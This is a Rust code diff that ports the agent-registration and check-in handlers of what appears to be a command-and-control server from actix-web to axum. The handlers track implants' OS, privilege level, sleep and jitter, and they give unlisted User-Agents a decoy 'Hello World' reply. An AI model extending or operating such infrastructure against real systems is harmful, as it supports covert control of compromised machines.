@@ -1,7 +1,14 @@
-use std::sync::Arc;
+use std::{collections::HashMap, net::SocketAddr, ops::DerefMut, sync::Arc};
 
-use actix_web::{web, HttpRequest};
+use chrono;
 use serde::Deserialize;
+use uuid::Uuid;
+use axum::{
+    extract::{ConnectInfo, Json, Query, State},
+    http::{HeaderMap, StatusCode},
+    debug_handler
+};
+
 
 use crate::{Agent, MAShared};
 
@@ -11,25 +18,52 @@ pub struct AgentInfo {
     elevated: bool
 }
 
-pub async fn agent_register(request: HttpRequest, agent_info: web::Json<AgentInfo>, shared: web::Data<Arc<MAShared>>) -> String {
-    let headers = request.headers();
-    let user_agent = headers.get("user-agent").unwrap();
+#[debug_handler]
+pub async fn agent_register(
+        hs: HeaderMap,
+        ConnectInfo(addr): ConnectInfo<SocketAddr>,
+        State(shared): State<Arc<MAShared>>,
+        Json(agent_info): Json<AgentInfo>,
+    ) -> String {
+    let user_agent = hs.get("user-agent").unwrap();
 
     if shared.profile.agents.allowed.iter().any(|v| v == user_agent) {
+        let uuid = Uuid::new_v4().to_string();
+
         shared.agents.lock().await.push(Agent { 
-            addr: request.connection_info().realip_remote_addr().unwrap().to_string(),
+            uuid: uuid.clone(),
+            addr: addr.to_string(),
             os: agent_info.os.clone(),
             elevated: agent_info.elevated,
             sleep: 10.0,
             jitter: 0.0,
-            last_ping: 0.0
+            last_ping: chrono::Local::now().timestamp()
         });
 
-        "Welcome to Rose".to_string()
-
+        uuid
     } else {
-        "Hello world".to_string()
+        "Hello World".to_string()
     }
+}
+
+pub async fn ping(
+        Query(params): Query<HashMap<String, String>>,
+        State(shared): State<Arc<MAShared>>
+    ) -> StatusCode {
+    let mut status_code = StatusCode::BAD_REQUEST;
+    let uuid = match params.get("uuid") {
+        Some(r) => r,
+        None => return StatusCode::BAD_REQUEST
+    };
+
+    for  agent in shared.agents.lock().await.deref_mut() {
+        if agent.uuid.eq(uuid) {
+            agent.last_ping = chrono::Local::now().timestamp();
+            status_code = StatusCode::OK
+        }
+    }
+
+    status_code
 }
 
 pub async fn get_target() -> String {
